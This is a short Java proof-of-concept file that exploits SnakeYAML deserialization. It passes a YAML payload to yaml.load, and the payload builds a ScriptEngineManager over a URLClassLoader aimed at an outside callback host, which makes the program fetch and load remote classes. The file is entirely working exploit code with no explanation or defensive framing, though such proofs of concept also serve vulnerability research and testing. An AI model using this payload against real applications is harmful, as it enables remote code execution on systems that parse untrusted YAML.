package URLPoC;

import org.yaml.snakeyaml.Yaml;

public class OriginalPoC {
    public static void main(String[] args) throws Exception {
        String payload =
                "!!javax.script.ScriptEngineManager [\n" +
                        "  !!java.net.URLClassLoader [[\n" +
                        "    !!java.net.URL [\"http://poc.dero5bv4.eyes.sh\"]\n" +
                        "  ]]\n" +
                        "]";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
